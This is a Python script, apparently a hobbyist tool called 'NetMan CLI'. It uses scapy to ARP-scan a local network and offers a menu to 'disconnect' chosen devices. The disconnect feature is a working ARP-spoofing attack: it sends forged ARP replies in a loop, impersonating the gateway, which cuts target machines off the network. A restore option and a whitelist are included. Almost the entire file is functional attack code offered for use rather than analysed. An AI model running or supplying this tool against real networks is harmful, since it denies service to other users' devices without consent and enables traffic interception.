import os
import time
import csv
from scapy.all import ARP, Ether, srp, send

WHITELIST = set()
DISCONNECTED_DEVICES = set()
GATEWAY_IP = ""
GATEWAY_MAC = ""

def get_network_range():
    return "192.168.1.0/24"

def scan_network():
    print("[+] Scanning network...")
    arp = ARP(pdst=get_network_range())
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    result = srp(packet, timeout=2, verbose=0)[0]
    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})
    return devices

def disconnect_device(ip, mac):
    print(f"[!] Disconnecting {ip} ({mac})")
    DISCONNECTED_DEVICES.add(ip)
    def loop():
        while ip in DISCONNECTED_DEVICES:
            packet = ARP(op=2, pdst=ip, hwdst=mac, psrc=GATEWAY_IP)
            send(packet, verbose=0)
            time.sleep(2)
    from threading import Thread
    Thread(target=loop, daemon=True).start()

def restore_device(ip, mac):
    print(f"[+] Restoring {ip} ({mac})")
    packet = ARP(op=2, pdst=ip, hwdst=mac, psrc=GATEWAY_IP, hwsrc=GATEWAY_MAC)
    send(packet, count=5, verbose=0)
    DISCONNECTED_DEVICES.discard(ip)

def save_to_csv(devices, filename="scan_results.csv"):
    with open(filename, "w", newline='') as file:
        writer = csv.writer(file)
        writer.writerow(['IP Address', 'MAC Address'])
        for device in devices:
            writer.writerow([device['ip'], device['mac']])
    print(f"[+] Results saved to {filename}")

def main():
    global GATEWAY_IP, GATEWAY_MAC

    if os.geteuid() != 0:
        print("[-] Please run this script with sudo/root access.")
        exit()

    print("\n============================")
    print(r"""        
░▒▓███████▓▒░░▒▓████████▓▒░▒▓████████▓▒░▒▓██████████████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░    ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
  ____          _____  _    _ _       _____         _____  
 |  _ \        |  __ \| |  | | |     / ____|  /\   |  __ \ 
 | |_) |_   _  | |__) | |  | | |    | (___   /  \  | |__) |
 |  _ <| | | | |  ___/| |  | | |     \___ \ / /\ \ |  _  / 
 | |_) | |_| | | |    | |__| | |____ ____) / ____ \| | \ \ 
 |____/ \__, | |_|     \____/|______|_____/_/    \_\_|  \_\
         __/ |                                             
        |___/                                              
""")
    print("============================\n")

    GATEWAY_IP = input("Enter Gateway IP (e.g. 192.168.1.1): ")
    GATEWAY_MAC = input("Enter Gateway MAC (e.g. aa:bb:cc:dd:ee:ff): ")

    while True:
        print("\n===== NetMan CLI Menu =====")
        print("1. Scan network")
        print("2. Disconnect a device")
        print("3. Restore a device")
        print("4. Disconnect multiple devices")
        print("5. Restore all")
        print("6. Whitelist a MAC address")
        print("7. Save scan to CSV")
        print("8. Exit")
        choice = input("Select an option: ")

        if choice == '1':
            devices = scan_network()
            for idx, device in enumerate(devices):
                print(f"{idx+1}. IP: {device['ip']}\tMAC: {device['mac']}")

        elif choice == '2':
            ip = input("Enter target IP to disconnect: ")
            mac = input("Enter target MAC: ")
            if mac in WHITELIST:
                print("[-] Device is whitelisted.")
            else:
                disconnect_device(ip, mac)

        elif choice == '3':
            ip = input("Enter target IP to restore: ")
            mac = input("Enter target MAC: ")
            restore_device(ip, mac)

        elif choice == '4':
            count = int(input("How many devices to disconnect? "))
            for _ in range(count):
                ip = input("IP: ")
                mac = input("MAC: ")
                if mac not in WHITELIST:
                    disconnect_device(ip, mac)

        elif choice == '5':
            for ip in list(DISCONNECTED_DEVICES):
                mac = input(f"Enter MAC for {ip} to restore: ")
                restore_device(ip, mac)

        elif choice == '6':
            mac = input("Enter MAC to whitelist: ")
            WHITELIST.add(mac)
            print("[+] Whitelisted.")

        elif choice == '7':
            devices = scan_network()
            save_to_csv(devices)

        elif choice == '8':
            print("[+] Exiting NetMan...")
            break

        else:
            print("[-] Invalid option. Try again.")

if __name__ == '__main__':
    main()
